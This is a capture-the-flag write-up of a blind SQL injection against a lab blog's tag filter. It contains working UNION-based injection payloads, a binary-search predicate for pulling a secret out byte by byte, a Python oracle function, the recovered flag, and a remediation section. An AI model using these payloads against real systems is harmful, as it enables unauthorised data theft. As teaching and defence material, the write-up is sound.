# The Daily Byte - blind content-based (marker) SQLi (SQLite)

| | |
|---|---|
| **Challenge** | The Daily Byte |
| **Category** | SQLI |
| **Points / Difficulty** | 300 / hard |
| **Target** | http://sqli5.chal.deti:8034 |
| **Bug** | CWE-89 - blind/inferential SQL injection, content (marker) channel |

## Hint
> Pick a tag, read the titles. Some lines appear, some don't. Make one line the truth.

## Recon
- `/?tag=<tag>` filters posts: `... WHERE tag = '<tag>'`, injected raw.
- **No echo, no match count, errors silent.** Only the list of post titles
  (`<h3>`) renders → that *list content* is the only channel.
- 4-column query; title = column 2. Confirmed:
  `zzz' UNION SELECT 1,'ZZXMARKERXZZ',3,4 --` → the marker appears as a post.

## Approach
Blind, but the oracle is **content presence**, not a count: UNION in a fake post
whose title is a marker, **gated by a WHERE predicate** - the marker row appears
only when the predicate is true.

```
tag = zzz' UNION SELECT 1,'ZZXMARKERXZZ',3,4 WHERE (<predicate>) --
```
- `oracle(cond)` = `ZZXMARKERXZZ` present in the response.
- Verified: `WHERE 1=1` → marker shows; `WHERE 1=2` → marker gone.
- Binary-search `vault.secret` byte by byte with
  `(SELECT unicode(substr(secret,i,1)) FROM vault LIMIT 1) > mid`.

**Marker choice:** the app HTML-escapes output, so a marker containing `<`/`>`
would arrive as entities; using an alphanumeric marker (`ZZXMARKERXZZ`) survives
escaping so a plain substring check is reliable.

## Exploitation
`solve.py` - same binary-search engine as DropLite, different oracle:
```python
def oracle(cond):
    tag = f"zzz' UNION SELECT 1,'ZZXMARKERXZZ',3,4 WHERE ({cond}) -- "
    return "ZZXMARKERXZZ" in session.get(f"{BASE}/", params={"tag": tag}).text
```

## Flag
```
flag{a050282f1c16be8f399bf52ae5c7a819}
```
(38 chars, **274 requests**)

## Channel contrast - DropLite vs The Daily Byte
Both are blind (no data returned) and cost ~the same (~274 reqs), but the oracle
differs. **DropLite** always renders a list and reports a **match count**, so the
boolean rides the *count* (all-vs-none). **The Daily Byte** shows *no count and
echoes nothing* - when the predicate is false the gated UNION row simply isn't
there, so the boolean rides **content presence** (a marker row appears or not).
Rule of thumb: use the **count** channel when the page always renders something
measurable; use the **content/marker** channel when a false predicate makes the
page render *nothing* distinguishable except the row you injected.

## Root cause & remediation
- **Cause:** the tag is concatenated into the SQL string (CWE-89); even with no
  data echoed, a UNION-injected row's visibility leaks a boolean.
- **Fix:** parameterise (`WHERE tag = ?`); keep secrets out of a table reachable
  by the public query; rate-limit to blunt inferential extraction.
